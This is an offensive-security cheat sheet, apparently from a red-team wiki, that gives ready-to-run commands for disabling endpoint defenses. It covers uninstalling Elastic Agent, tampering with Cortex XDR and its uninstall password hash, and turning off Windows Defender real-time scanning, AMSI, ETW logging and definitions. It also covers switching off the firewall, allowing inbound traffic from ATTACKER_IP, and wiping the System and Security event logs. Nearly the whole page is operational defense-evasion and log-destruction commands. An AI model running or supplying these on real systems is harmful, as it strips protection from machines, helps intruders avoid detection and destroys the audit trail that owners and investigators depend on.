# ⭕ Disabling Defenses

{% embed url="https://github.com/ayeskatalas/Sophos-Removal-Tool" %}

{% embed url="https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html" %}

## <mark style="color:red;">Elastic</mark>

{% embed url="https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html" %}

```
cd "C:\Program Files\Elastic\Agent\"
PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
Elastic Agent has been uninstalled.
```

## <mark style="color:red;">Cortex XDR</mark>

```
# Global uninstall password: Password1
Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
Look for PasswordHash, PasswordSalt or password, salt strings.

# Disable Cortex: Change the DLL to a random value, then REBOOT
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f

# Disables the agent on startup (requires reboot to work)
cytool.exe startup disable

# Disables protection on Cortex XDR files, processes, registry and services
cytool.exe protect disable

# Disables Cortex XDR (Even with tamper protection enabled)
cytool.exe runtime disable

# Disables event collection
cytool.exe event_collection disable
```

## <mark style="color:red;">Windows Defender</mark>

```
# Disable Defender
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## <mark style="color:red;">Windows Firewall</mark>

```
Netsh Advfirewall show allprofiles
NetSh Advfirewall set allprofiles state off

# ip whitelisting
New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
```

## <mark style="color:red;">Clear System and Security Logs</mark>

```
cmd.exe /c wevtutil.exe cl System
cmd.exe /c wevtutil.exe cl Security
```
